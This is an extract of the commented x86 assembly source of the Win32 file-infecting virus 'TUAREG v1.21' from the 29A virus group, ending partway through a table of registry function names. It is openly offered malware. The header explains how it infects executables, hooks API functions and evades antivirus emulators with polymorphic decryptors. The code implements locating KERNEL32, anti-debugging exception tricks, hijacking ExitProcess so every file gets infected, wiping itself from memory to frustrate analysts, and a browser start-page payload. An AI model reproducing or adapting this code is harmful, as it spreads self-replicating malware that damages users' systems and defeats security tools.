
;;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
;;ﬂﬂ€ﬂﬂﬂ € €ﬂﬂ€ €ﬂ€‹ €ﬂﬂﬂ €ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;;ﬁ € €  € €  € € ‹€ €    € ƒƒƒƒƒƒƒƒƒ Designed to carry the ƒƒƒƒƒ › ﬁ ‹› ﬁﬂ›‹›
;;ﬁ € €  € €ﬂﬂ€ €ﬂ€‹ €ﬂﬂ  € ﬂ€ ƒƒƒ TUAREG polymorphing engine ƒƒƒ ﬁ ›  ›  ‹› ›
;;ﬁ € €‹‹€ €  € €  € €‹‹‹ €‹‹€ ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ €   ›‹ﬁ‹‹ ›
;;ﬁ €‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
;;ﬁ
;;ﬁ›     ﬂﬂ€ﬂﬂ      €€ ﬁ€      €‹‹  ›  ﬁ€ﬂ›    ﬁ ›          €  ﬁﬂﬂ› ﬁﬂﬂ€ ﬁﬂﬂ›
;;ﬁ›       €ﬁ       €ﬁ ›€      ﬁ›   ›  ﬁ› ﬁ›  ﬂﬁ ›         ﬁ›  €  € €  ﬁ €  €
;;ﬁﬂ›› ›   ›ﬁﬂ€ﬁ€›  › € ›ﬁ€›€ﬂ€ﬁ ﬂﬂ››  ﬁ  ﬁ €ﬂﬁﬁ ›ﬁ€›ﬁ€ﬂ   €     ﬁ   ﬂﬂ€ €ﬂﬂ€
;;ﬁ‹›€‹›   ›ﬁ ﬁﬁ‹‹  ›   ›ﬁ‹‹ﬁ ﬁﬁ €€›€  ﬁ‹‹› › ﬁﬁ›€ﬁ‹‹ﬁ    ﬁ›   ‹€€‹‹ ‹‹€ﬁ›  ﬁ›
;;ƒƒƒƒƒ›ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
;;   ﬂﬂ
;; This virus is designed to carry the Tameless Unpredictable Anarchic Relent-
;; less Encryption Generator (TUAREG), so I decided to name the virus as the
;; engine. Apart from generating extremely polymorphic samples, the virus does
;; other things apart from carrying the engine.
;;
;; This is the version 1.21. The version 1.0 was sent to AVers before the re-
;; lease of this version in 29A#5, so I have had time to improve some things,
;; correct some bugs and make new features, like more complex garbage on de-
;; cryptors, the routine for zeroing the memory before terminate the program,
;; etc. The version 1.1 was sent too, but too late I realized of a "bug" in
;; the infection procedure (but NOT in the TUAREG) that made some programs to
;; refuse execution, so I corrected some lines of code, added some others, im-
;; proved the TUAREG engine greatly (now it's v1.01) and I call from all that
;; I got "TUAREG v1.21".
;;
;; In this version:
;;               Virus total binary size: 20994 bytes
;;   Infection virtual and physical size: 65536 bytes
;;                 Binary size of TUAREG: 12951 bytes (only main engine)
;; Average size of a generated decryptor: 9.26 Kb
;;
;; Technical notes:
;;------------------
;;  - It infects all *.EXEs, *.SRCs and *.CPLs on current, windows and
;;   windows\system directories, and the programs set for execution at
;;   windows startup.
;;
;;  - It's also a per-process resident, patching the next functions:
;;   GetProcAddress, CreateFileA, CreateProcessA, FindFirstFileA,
;;   FindNextFileA, GetFileAttributesA, SetFileAttributesA, GetFullPathNameA,
;;   MoveFileA, CopyFileA, DeleteFileA, WinExec, _lopen, MoveFileExA and
;;   OpenFile. ExitProcess is also patched, but for special actions.
;;
;;  - The RVAs of the functions are obtained scanning the export directory
;;   of KERNEL32, doing a checksum of the name of every function and compa-
;;   ring it with the stored checksums on the virus. When someone coincides,
;;   then the corresponding RVA is set on the virus' calling address.
;;
;;  - On infection, it'll place the generated decryptors on .text section,
;;   and the .reloc section will be anulated, renamed and overwritten with
;;   the encrypted data and the overwritten code of .text. If it's not big
;;   enough, its size will be increased until all the stuff fit in it. If
;;   there isn't any .reloc section, then a new section with a random name
;;   will be added (if there is enough space in the EXE header).
;;
;;  - Then, the infection mark will be: if there's a .reloc section, the
;;   file isn't infected, and neither if the .rsrc section is the last. If
;;   .rsrc section isn't the last section of all, the file won't be infected,
;;   since it could be already. I know it isn't the best system, but I was
;;   tired of coding :). In the future I'll do a less noticeable infection.
;;
;;  - The virus is polymorphic, using the TUAREG. Moreover, a little also
;;   polymorphic decryptor (to avoid cryptanalisis) has been put. It's not as
;;   polymorphic as TUAREG generated ones (well, compared to the TUAREG gene-
;;   rated decryptors, the little one shouldn't be called "a decryptor" :),
;;   but well...
;;
;;  Notes about the TUAREG
;;--------------------------
;;  TUAREG has been a neverending project practically since I entered in the
;; viruscene. My initial releases didn't resemble in any way with the result
;; (this one), but in spite of this fact, I'm thousands of times more proud
;; of this result than ever, since I didn't expected such a complexity after
;; a so easy coding of it (well, not sooooo easy, but it was not like coding
;; the MeDriPolEn, where there were things that I didn't know what they do,
;; although they functioned well :), but I knew every moment what was expected
;; for every portion of code).
;; After correcting some little bugs (and not so little, but dark ones), I
;; got very surprised with the result. Oh, errmh... if I explain first what
;; the engine does, maybe the explanations will be easier :). So let's see:
;;
;; - The TUAREG is based in two main techniques that I explain in the article
;;  called "Advanced decryptor construction", which are PRIDE and Branching.
;;  PRIDE (Pseudo-Random Index DEcryption) avoids linear decryption, seeming
;;  a normal access of an application over its data, and Branching avoids the
;;  linear execution of a decryption loop, since it can execute sixteen types
;;  of different code that performs exactly the same action, so there isn't
;;  any manner of knowing the behaviour of the engine (which path is going
;;  to take everytime) without emulation.
;;
;; - To perform the Branching, the entire engine has been oriented to execute
;;  in nearly absolute recursivity, simplifying alot many actions, and taking
;;  advance of this to create very structured portions of code that could be
;;  on any program. Not in vane, the size of the decryptors overpasses 8 Kb of
;;  pure code in the majority of times.
;;
;;  - The phylosophy of this engine is completely different from the
;;  MeDriPolEn. Since I based that one on simulate a corrupted file, this time
;;  I simulate a normal application. Every branch has this "format":
;;
;;   ------*-------*-------*--------xxxxxxxxxxxxx--<>------() -----|----|---|
;;  Legend:
;;  -- : Garbage
;;   * : Random conditional jump to another branch
;;   x : Decryption code (mixed with garbage)
;;  <> : Check of end-of-decryption. If it isn't, it performs a random jump
;;      to any * on any branch
;;  () : Code to jump to the decrypted part, and the code of this branch ends.
;;  ----| : Subroutines that are created while coding this branch. The addres-
;;         ses of that subroutines are stored into an array which allows to
;;         other branches to do calls to that subroutines apart from their own
;;         ones.
;;  This type of code is repeated several times and it's randomized alot.
;;
;;  - The garbage is quite complex to give up the less advanced emulators. The
;;   generator can do CALLs with stack entries and stack frames (emulation of
;;   this), nested CALLs, conditional jumps with non-zero displacement, memory
;;   read/writes (performed to .bss when this section exists in the infected
;;   file), 8 and 32 bit common types (some 16 bit ones are avoided on purpo-
;;   se, due to some emulators that take them as suspicious on a Win32 app.),
;;   random short loops between code, relative jump to the decrypted code (re-
;;   quires execution/emulation for a correct running of it), calls to impor-
;;   ted KERNEL32 functions (it was hard to make it!), etc. etc. etc., and I
;;   don't use any one-byte usual garbage on poly engines (those CLCs, CMCs,
;;   STIs, etc. are highly suspicious for an emulator, so I didn't put anyone
;;   of them, except on the little second decryptor, which is under the main
;;   encryption layer).
;;
;;  - Before entering to the TUAREG engine, the virus scans the victim's body
;;   to determine the future virtual address of the import table and the vir-
;;   tual addresses of the import table fields, and it fills the fields in the
;;   APIInfo blocks to know which address it has to use to make a calling to
;;   that KERNEL32 function. Once made, the virus will call any of the "con-
;;   trolled" APIs that were also in the import table. I think it's the first
;;   virus (November 2000) that makes API callings in the decryptor :). The
;;   called APIs are ordered in frequency of apparition in an application, and
;;   with a little algorithm we make the first ones to be selected more often
;;   than the next ones (in descendent order).
;;
;;  - Some other internal features that "beautifies" the code.
;;
;;  More about the virus itself
;;-------------------------------
;;  - Since it's a v1.21, it was code over the version 1.0 (of course), so if
;;   some code isn't commented is because I was lazy to do it :), and many
;;   things are changed from v1.0 (bugs corrected, some things improved, etc.)
;;
;;  - The KERNEL32 address is found using the address pushed onto the stack
;;   from the beginning. It's easy, it doesn't generate errors (since most
;;   Microsoft C compiled programs use the fact that that address exists),
;;   and it's compatible with all versions of Win32 (I think). Anyway, the
;;   virus uses SEH. If any exception occurs while any operation, the virus
;;   will restore the old SEH and execute the host.
;;
;;  - After finding the RVAs of the API functions, it performs a runtime in-
;;   fection.
;;
;;  - After that, the virus patches the import table of the file and set its
;;   per-process part.
;;
;;  - If the API functions couldn't be obtained, the virus will exit. Other-
;;   wise, if WriteProcessMemory nor GetCurrentProcess RVAs aren't obtained,
;;   it will simulate an error of execution, since it can't restore the host.
;;
;;  - Before returning to the host, it'll try to patch all the ocurrences of
;;   ExitProcess in the host and make them to point to the routine prepared
;;   on this virus to hold it (that's what I call "Pseudo-EPO" :). When the
;;   application calls to ExitProcess, the virus takes control, and since the
;;   program is "under the user's view" terminated, we can perform intensive
;;   virus activity, as a background action. What we do here is to infect all
;;   programs, not only one of each four, with runtime infection, and then we
;;   overwrite all the virus code with zeroes to avoid AVers to have a clean
;;   copy of the virus in memory when executing on a simulated environment and
;;   waiting for the end of running.
;;
;;  - In this version, the virus is very stable, and an average user won't
;;   notice the presence of the virus by errors in the system, since even the
;;   TUAREG (the most complex code I ever make) hasn't any errors now (from
;;   what I know), nor the infection system.
;;
;;  Payload
;;-----------
;;  On the first and third friday of every month, the start pages on the two
;; most used navigators (Internet Explorer and Netscape Communicator) will be
;; set to http://www.thehungersite.com, which it's a web that donates food to
;; hungry countries bought with the money that they earn when you visit the
;; banners. The virus sets this using the ADVAPI32.DLL registry functions.
;;
;;  With this, I could say that maybe it's the first payload in the viruses'
;; history that performs something useful and maybe changes some minds about
;; the state of our world. Hey, and you can do it too! Enter in that URL
;; (http://www.thehungersite.com) and press "Donate food". It's easy, free and
;; can save lives!
;;
;;  About this, I saw some time ago in alt.comp.virus (Usenet) a discussion
;; about this virus. A guy asked if this virus can be called a good virus or
;; what (due to the payload), and it generates a good discussion about the
;; ethicals of virus writing to make this type of things. Well, I did it be-
;; cause I wanted to make a payload that make something more than fuck the
;; user. And it's far from my intention to difamate the URL I redirect naviga-
;; tors to, but it's the most famous and most trustable donation service that
;; I saw over the internet, and moreover this page has links to other free do-
;; nation services. I don't care about that ones that think its start page is
;; "holy" and nobody must touch it (the ones that think that their own home
;; comfort is above anyone's life - get a life!), but I care about the ones
;; that think the action is good but the way is bad (a virus). My apologizes,
;; but you have to think that a virus is a piece of code, not a fragment of
;; The Apocalypse :).
;;
;; My thanks to:
;;---------------
;;
;; The whole 29A - members and ex-members, because it's the Dream Team of
;;  the vx!
;; All ppl who innove and create in this scene, and don't destruct the work
;;  of anyone (I HATE destructive payloads! :)
;; To you, for reading this

;; To assemble this:
;; TASM32 /m29A /ml tuareg.asm
;; TLINK32 -aa -Tpe -x tuareg.obj,,,import32.lib
;; PEWRSEC tuareg.exe

.386p
.model flat
locals
.data
;; Message on first generation
Titulo  db      'Virus TUAREG v1.21 1st Generation by The Mental Driller/29A',0
Mensaje db      'You have been infected with the first generation',0dh,0ah
        db      'of the virus TUAREG by The Mental Driller/29A',0
.code
extrn   ExitProcess:PROC  ; For the fake host
extrn   MessageBoxA:PROC

Virus_Size      equ     offset End_Virus - offset Inic_Virus
Virus_SizePOW2  equ     10000h    ; I don't think it overpasses 65536 bytes.
                                 ; Since this size is virtual, I don't care
                                 ; very much about this one.
Host_Data_Size  equ     4000h ; This one is the one to worry about! :)
                              ; It's physical!

TuaregMain      proc
Inic_Virus      label   dword

;; This decryptor will be  generated later. It's a full polymorphic one, al-
;; though very simple, to avoid cryptanalisys. The structure is as follows:
;;
;; MOV Reg,InicDecryptVirus
;; MOV Reg2,Virus_Size / 4
;; MOV Reg3,CryptKey
;; Loop:
;; XOR/ADD/SUB [Reg],Reg3
;; ADD Reg,4
;; ADD/SUB/XOR/ROL1 Reg3,Modifier
;; DEC Reg2
;; JNZ Loop
;;
;; The MOVs can be MOVs, LEAs or pairs PUSH/POP, and it can use DEC or SUB,1
;; or ADD,-1 , randomly selected. Well, quite better than v1.0 (which was a
;; fixed decryptor where I changed values).
                db      3Ch dup (90h)
InicDecryptVirus:
                cld           ; Restore possible STD
                push    eax
                call    GetDeltaOffset
GetDeltaOffset: pop     ebp
                sub     ebp, offset GetDeltaOffset
                mov     [ebp+DeltaOffset2], ebp  ; This is needed!
                mov     [ebp+DeltaOffset3], ebp
                mov     [ebp+DeltaOffset4], ebp
                mov     [ebp+DeltaOffset5], ebp
                db      0Fh, 31h ; rdtsc         ; Get CPU timestamp
                mov     [ebp+DwordAleatorio1], eax ; Set EAX (low timestamp)
                                                   ; on random seed
         ;; Put the return address
                mov     eax, [ebp+InicIP]
                mov     [esp], eax
                mov     eax, [ebp+RestoreAddress]
                mov     [ebp+RestoreAddress2], eax
                mov     eax, [ebp+SizeOfText]
                mov     [ebp+SizeOfText2], eax
                mov     eax, [ebp+ImageBase]
                mov     [ebp+ImageBase2], eax

         ;; Set this counter to 0. Later we check if this counter has
         ;; increased to the correct number of functions.
                mov     byte ptr [ebp+CounterOfFunctions], 0
         ;; Get the stack returning value for "CreateProcess". This value
         ;; allows Win32 apps to finish with RET (many Micro$oft programs
         ;; use this fact)
                mov     eax, [esp+4]
                and     eax, 0FFFFF000h
                mov     dword ptr [ebp+Addr_Kernel32], eax ; Store it for adj.
                mov     dword ptr [ebp+AuxCounter], 100h  ; Times to search

           ;; SEH frame
                lea     eax, [ebp+@@JumpToHost]
                push    eax
                push    dword ptr fs:[0]
                mov     fs:[0], esp
                mov     [ebp+LastStack], esp     ; For SEH returning
             
@@Loop_001:     sub     dword ptr [ebp+Addr_Kernel32], 1000h ; Subtract
                mov     eax, [ebp+Addr_Kernel32]
                cmp     word ptr [eax], 'ZM'       ; EXE header?
                jz    @@MaybeKernelFound           ; If so, jump
                dec     dword ptr [ebp+AuxCounter] ; Decrease counter
                jnz   @@Loop_001                   ; If it isn't 0, loop
                push    ds
                pop     ax
                cmp     ax, 0137h   ; If actual selector is less, we're in NT
                jb    @@GenerateException  ; No hard-coded address for WinNT
                mov     eax, 0BFF70000h ; Hard-coded under Win9x
                jmp   @@KernelFound2    ; Jump

;; This code, in fact, will jump to the host execution, since it's set as our
;; SEH manager. So, a jump here will execute host. Quite anti-debugger :)
@@GenerateException:
                xor     ebx, ebx
                dec     ebx
                mov     [ebx], cl

@@MaybeKernelFound:
                mov     ebx, [eax+3Ch]  ; Get PE address
                add     ebx, eax
                cmp     word ptr [ebx], 'EP' ; Is it a PE header?
                jnz   @@Loop_001        ; If not, continue searching

         ;; Now we are here when we found the address of Kernel32
@@KernelFound2: mov     dword ptr [ebp+RVA_GetCurrentProcess], 0 ; We must set
                mov     dword ptr [ebp+RVA_WriteProcessMemory], 0  ; this to 0
                mov     dword ptr [ebp+ExitProcessInImport], 0
                mov     esi, [ebx+78h]
                add     esi, eax       ; ESI=Export directory

                mov     ecx, [esi+18h] ; ECX=Number of names in the array
                mov     edx, [esi+20h]
                add     edx, eax       ; EDX=RVA to the names array
     @@LoopCRC_APIs:
                call    GetCRCOfAPI    ; Get checksum of the name under EDX
                xor     ebx, ebx       ; EBX=0
       @@LoopCheck:
                cmp     dword ptr [ebp+ebx+CRC_APIs], eax ; Coincidence?
                jz    @@FunctionFound     ; If it coincides, we have found one
                add     ebx, 4         ; Next
                cmp     dword ptr [ebp+ebx+CRC_APIs], 0 ; Have we finished?
                jnz   @@LoopCheck      ; If not, compare next stored checksum
       @@LoopCRC_APIs2:           ; Here if no one coincides
                add     edx, 4         ; Next RVA to function name
                dec     ecx          ;Arrgh! We are coding virus, so I had to
                jnz   @@LoopCRC_APIs ;use LOOP! :) (this is speed optimization
                                     ; but not size opt.!) bah, it doesn't
                                     ; matter...
                jmp   @@Continue_001
  @@FunctionFound:
                mov     eax, [esi+18h] ; Get its order in the array of names
                sub     eax, ecx
                shl     eax, 1         ; Convert it to word index
                add     eax, [esi+24h] ; Get the position into the ordinal
                                       ; array
                add     eax, [ebp+Addr_Kernel32] ; Add the base address
                movzx   eax, word ptr [eax]  ; Get the order into the function
                shl     eax, 2               ; array
                add     eax, [esi+1Ch]
                add     eax, [ebp+Addr_Kernel32]
                mov     eax, [eax]           ; Get the RVA of the function
                add     eax, [ebp+Addr_Kernel32]
                mov     dword ptr [ebp+ebx+FunctionsToPatch], eax ; Save it
                inc     byte ptr [ebp+CounterOfFunctions] ; Increase this
                jmp   @@LoopCRC_APIs2        ; Check more
  @@Continue_001:
       ;; [CounterOfFunctions] must be NumberOfFunctions. If not, something
       ;; failed (too much or too few functions for the correct work of the
       ;; virus) and we must exit.
                cmp     byte ptr [ebp+CounterOfFunctions], NumberOfFunctions
                jnz   @@GenerateException

                mov     byte ptr [ebp+InfectAllFiles], 0
                call    RuntimeInfection ; The name explains it ;)
                call    Payload     ; I don't remember for what is this... :P
                call    PatchImportDirectory
    ;; I changed the order of calling to this subfunctions, since an exception
    ;; executes directly the host. If an exception occurs when patching the
    ;; import directory, then the run-time infection woudln't run, so I have
    ;; put the functions in the correct order to grant a wider expansion.

                jmp   @@GenerateException  ; Finish runtime activity (the per-
                                    ; process part remains "resident")
      ; This jump is anulated since there isn't any need of it. Instead of
      ; that, we use a fault, since SEH is active and will go directly to
      ; @@JumpToHost :)

   ;; SEH handler. This is the SEH that we put. If any exception happens, this
   ;; will take control and it'll restore and execute directly the host.
@@JumpToHost:   db      0BDh
DeltaOffset3    dd      0                   ; This is MOV EBP,DeltaOffset
                mov     esp, [ebp+LastStack]  ; Recover ESP
                pop     dword ptr fs:[0]      ; Restore SEH
                pop     eax                   ; Release our handle from stack
           ; This has been changed since the binary release. I noticed it had
           ; a bug, so I corrected it. The binary that the AVers have differs
           ; a little from this.

                cmp     dword ptr [ebp+RVA_GetCurrentProcess], 0 ; RVAs got?
                jz    @@SimulateExecError          ; If not, we can't restore
                cmp     dword ptr [ebp+RVA_WriteProcessMemory], 0  ; the host
                jz    @@SimulateExecError
                call    dword ptr [ebp+RVA_GetCurrentProcess]
                push    0
                push    Host_Data_Size
                lea     ebx, [ebp+End_Virus]
                push    ebx
                push    dword ptr [ebp+RestoreAddress2]
                                  ; Restore the overwritten part of .text with
                push    eax       ; the original code, saved at the end of the
                call    dword ptr [ebp+RVA_WriteProcessMemory]         ; virus
                call    ModifyExitProcess ; Modify the exit process callings
                                          ; in .text to point to our zeroing
                                          ; routine
                ret     ; Jump to host

@@SimulateExecError:
                push    00BFF700h  ; Construct NOP/MOV BYTE PTR [BFF70000],0
                push    0005C690h  ; in the stack frame to generate an excep-
                jmp     esp        ; tion from an "unknown module" :)
                                   ; module" :)
TuaregMain      endp

InicIP          dd      offset FakedHost  ; This variables are set now to si-
RestoreAddress  dd      offset FakedHost  ; mulate an infected program.
RestoreAddress2 dd      0
CounterOfFunctions db   0

AuxCounter      dd      0
LastStack       dd      0

InfectAllFiles  db      0

;; This function generates a checksum of the function name pointed by [EDX]
;; in the export directory in KERNEL32. I've tried to do a quite variable
;; formula from one name to other, without using huge tables like the standard
;; CRC32.
GetCRCOfAPI     proc
                xor     eax, eax
                push    edx
                push    ecx
                mov     edx, [edx]
                add     edx, [ebp+Addr_Kernel32]
GetCRCOfAPI2:   mov     edi, edx   ; Load RVA to API name in EDI
     @@LoopAPI: cmp     byte ptr [edx], 0 ;If we reached the end of the name,
                jz    @@Return            ; exit
                mov     cl, [edx]  ; Get a number between 0 and 3 related to
                and     cl, 3      ; the current character in the name.
                rol     eax, cl    ; ROL the current value in EAX.
                xor     al, [edx]  ; XOR AL with the character in [EDX]
                inc     edx        ; Next char
                jmp   @@LoopAPI    ; Loop
   @@Return:    pop     ecx        ; When we arrive here, we have the checksum
                pop     edx        ; of the API name.
                ret             ; Return
GetCRCOfAPI     endp

;; Now the ident message. Never showed, but it'll help the AVers to name this
;; virus ;)
Ident_Virus     db      0,0,'[Virus TUAREG v1.21 by The Mental Driller/29A]',0
                db      '- This virus has been designed for carrying '
                db      'the TUAREG engine -',0,0

;; This functions scans for any ocurrence of ExitProcess in the .text section
;; and substitutes the address in the call for an address here. Once here, we
;; move a little program to the stack frame and then we jump there. That pro-
;; gram will overwrite the virus code with zeroes. This feature can fuck some
;; AVers programs that get a decrypted copy of the virus executing the infec-
;; ted program and waiting for finish.
ModifyExitProcess proc
                cmp     dword ptr [ebp+ExitProcessInImport], 0
                jz    @@Return          ; If ExitProcess doesn't exist in the
                                        ; import directory, finish
                lea     ebx, [ebp+AddressToLastFunc] ;Get the address to over-
                lea     eax, [ebp+LastFunction] ; write ExitProcess callings
                mov     [ebx], eax              ; with, pointing to our routi-
                                                ; ne
                mov     [ebp+AddressToAddressToLastFunc], ebx
                mov     esi, [ebp+RestoreAddress2] ; beginning of .text
                mov     ecx, [ebp+SizeOfText2] ; Quantity of code to scan
                sub     ecx, 6 ; Last 5 bytes can't contain a call, and maybe
                               ; we generate an exception if we overpass .text
                               ; size
  @@Loop_001:   lea     edi, [ebp+CallToSearch] ; Address to constructed call
                mov     edx, 6     ; Size of call
  @@Loop_002:   cmpsb              ; Test byte
                jnz   @@NextByte   ; If it isn't equal, jump
  @@Loop_003:   dec     edx        ; Decrease call-size counter
                jz    @@Found      ; If 0, we've found a call to ExitProcess
                cmp     edx, 5     ; Call-size counter=5?
                jnz   @@Next_001   ; If not, check normally
                dec     ecx        ; Decrease .text-size counter
                jz    @@Return     ; If it's 0, return
                inc     esi        ; Increase checking indexes
                inc     edi        ; ...And now check two possible opcodes:
                cmp     byte ptr [esi-1], 15h ; CALL [Address]
                jz    @@Loop_003              ; If it is, continue checking
                cmp     byte ptr [esi-1], 25h ; JMP [Address]
                jnz   @@NextByte       ; If it isn't, "restart" call string
                jmp   @@Loop_003   ; Check next byte (now normally)
   @@Next_001:  dec     ecx        ; End of .text?
                jnz   @@Loop_002   ; If not, continue checking that call
                jmp   @@Return     ; If yes, end
   @@NextByte:  dec     ecx        ; End of .text?
                jnz   @@Loop_001   ; If not, continue checking for calls
                jmp   @@Return     ; If yes, end
   @@Found:     dec     ecx     ; Decrease ecx (don't decreased before)
                pushad          ; Save regs
                push    0
                push    4       ; Write 4 bytes (overwrite address reference)
                lea     ebx, [ebp+AddressToAddressToLastFunc]
                push    ebx     ; Thing to write (the dword in this variable)
                lea     ebx, [esi-4]
                push    ebx     ; Place to overwrite (the address in the found
                                ; call)
                call    dword ptr [ebp+RVA_GetCurrentProcess]
                push    eax     ; Write on the current process
                call    dword ptr [ebp+RVA_WriteProcessMemory] ; Overwrite!
                popad           ; Restore registers values
                jmp   @@Loop_001 ; Continue looking for calls to ExitProcess
      @@Return: ret        ; Return  
ModifyExitProcess endp

CallToSearch    db      0FFh, 15h  ; Here we construct a call to ExitProcess
ExitProcessInImport dd  0          ; for searching it over .text

SizeOfText      dd      100h   ; This is the value on first generation, but
                               ; it's set with the real value on infection
SizeOfText2     dd      0    ; Variable to save this value and don't overwrite
                             ; it when infecting
AddressToLastFunc dd    0    ; Some vars to overwrite the call to ExitProcess
AddressToAddressToLastFunc dd   0

;; This function is the one that we make ExitProcess to point to. Well, we
;; make that the calls to ExitProcess point here, so they aren't calls to
;; ExitProcess anymore, but here... bah, more or less :). The fact is that if
;; we patched correctly the calls to ExitProcess, this function will be called
;; when you close the application (alt-F4, or Close in its menu, etc. etc.),
;; and here we can make lots of things without being noticed by the user as
;; easily as if we make it at the beginning, because s/he closed the applica-
;; tion and the desktop was restored, seeming a complete exiting, but this
;; virus is still alive! When we arrive here, we infect ALL files, since we
;; haven't to do the things quickly (and you can think: then, why don't you
;; wait for this function to do all and make things more unnoticeable? Because
;; if ExitProcess patching fails, at least the virus has been spreaded a
;; bit ;). Before the massive infection, we complete a little overwriting rou-
;; tine and we copy it to the stack frame. After infection, we jump there, and
;; that routine will overwrite all the virus body with 0s to avoid getting a
;; clean copy of the virus when the application ends (AVers use that technique
;; quite a lot). If I made the virus without per-process residency, I could
;; make it before jumping to the restored host, but well...
LastFunction    proc
                pop     eax
                lea     edi, [esp-1800h] ; Copy the routine to the stack (qui-
                                         ; te far up, to avoid overwriting)
                db      0BDh             ; MOV EBP,xxx
DeltaOffset4    dd      0                ; EBP=DeltaOffset
                mov     [ebp+ExitCode], eax
                mov     esp, [ebp+LastStack] ; Get the saved stack address
                add     esp, 0Ch             ; Eliminate some things of B4
                mov     eax, [ebp+RVA_ExitProcess] ; Get the address to there
                mov     [ebp+ExitProcessAddr], eax ; Complete the instruction
                mov     [ebp+SetValueToEDI], edi   ; Set the jumping value
                lea     esi, [ebp+ZeroingFunction] ; ESI=Address to function
                lea     eax, [ebp+Inic_Virus]     ; EAX=Beginning of the virus
                mov     [ebp+InicAddressFor0], eax ; Complete instruction
                mov     ecx, offset ZeroingFunctionEnd-offset ZeroingFunction
                cld                            ; ECX=Size of zeroing routine
                rep     movsb                  ; Copy routine
                mov     byte ptr [ebp+InfectAllFiles], 1 ; Now infect all fi-
                                    ; les on current, windows and system
                                    ; directories, instead of one of each four

           ;; SEH frame
                lea     eax, [ebp+@@JumpToFinish]
                push    eax
                push    dword ptr fs:[0]
                mov     fs:[0], esp
                mov     [ebp+LastStack], esp     ; For SEH returning

                call    RuntimeInfection
   @@JumpToFinish:
@@JumpToHost:   db      0BDh
DeltaOffset5    dd      0                   ; This is MOV EBP,DeltaOffset
                mov     esp, [ebp+LastStack]  ; Recover ESP
                pop     dword ptr fs:[0]      ; Restore SEH
                pop     eax                   ; Release our handle from stack
                push    dword ptr [ebp+ExitCode]
                db      0BFh
SetValueToEDI   dd      0     ; Get the address to jump to overwrite this code
                jmp     edi   ; Jump there
LastFunction    endp

ExitCode        dd      0

;; This function, after being completed, is the one that we copy to the stack
;; frame to jump and overwrite the code of this virus. After overwriting it,
;; we call to ExitProcess and finish the activity
ZeroingFunction proc
                mov     edi, 12345678h   ; EDI=Beginning address of virus
                org     $-4
InicAddressFor0 dd      0
                xor     eax, eax         ; EAX=6726D43Ah :P
                mov     ecx, Virus_SizePOW2 / 4 ; ECX=Virtual size in dwords
                rep     stosd            ; Overwrite!
                mov     eax, 12345678h   ; Before, we put here the address to
                org     $-4              ; ExitProcess
ExitProcessAddr dd      0
               ; push    0                ; Push ExitProcess return value
                                         ; It's set from before!
                call    eax              ; Return
ZeroingFunction endp
ZeroingFunctionEnd label dword
; NOTE: When I was commenting this code (now, for me :), I realized that an
; infected application always will return 0 as errorlevel when ExitProcess,
; because I push a 0 before calling ExitProcess. The correct way of doing this
; would be get the value from stack and push it now, since it comes from a
; call to ExitProcess that we patched. I realized of this "bug" after sending
; the final version to AVers, so I didn't correct it on this source. Now it's
; corrected.

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; PAYLOAD                                                                  ;;
;;                                                                          ;;
;; On the first and third Friday of the month, the start pages of Netscape  ;;
;; and Internet Explorer are changed to "http://www.thehungersite.com".     ;;
;; The first really useful payload in the viruscene history! (Well, I dunno ;;
;; if it is the first, but I like to think it :)                            ;;
;;                                                                          ;;
;; It's not as easy as it could seem!                                       ;;
;; Internet Explorer --> We modify the registry entry where the start page  ;;
;;                       is especified                                      ;;
;; Netscape --> We get the directories of all the users via the registry    ;;
;;              and add a line to the file PREFS.JS setting a new start     ;;
;;              page                                                        ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

KEY_ALL_ACCESS          equ     000F003Fh  ; Values for the registry functions
HKEY_CLASSES_ROOT       equ     80000000h
HKEY_CURRENT_USER       equ     80000001h
HKEY_LOCAL_MACHINE      equ     80000002h
HKEY_USERS              equ     80000003h

Payload         proc
                lea     eax, [ebp+SystemTime]
                push    eax
                call    dword ptr [ebp+RVA_GetSystemTime] ; Get date and time
                cmp     word ptr [ebp+DayOfWeek], 5  ; Friday?
                jnz   @@EndOfPayload                 ; If not, end
                cmp     word ptr [ebp+Day], 7   ; First week of the month?
                jbe   @@DoPayload               ; If not, end
                cmp     word ptr [ebp+Day], 14  ; Second week discarded
                jbe   @@EndOfPayload
                cmp     word ptr [ebp+Day], 21  ; Third week of the month?
                ja    @@EndOfPayload            ; If not, end
         @@DoPayload:
    ; We load ADVAPI32.DLL. It's normally loaded, but in this way we'll get
    ; the module handle, and just in case if it's not loaded.

                call    LoadRegistryFunctions
                or      eax, eax
                jz    @@EndOfPayload

                call    ModifyInternetExplorer  ; Self-explanatory names ;)
                call    ModifyNetscapeNavigator
                push    dword ptr [ebp+HandleADVAPI32]
                call    dword ptr [ebp+RVA_FreeLibrary]
    @@EndOfPayload:
                ret
Payload         endp

;;; Registry functions
RegistryDLL             db      'advapi32.dll',0
ASC_RegistryFunctions   label   dword
ASC_RegOpenKeyExA       db      'RegOpenKeyExA',0
ASC_RegCloseKey         db      'RegCloseKey',0
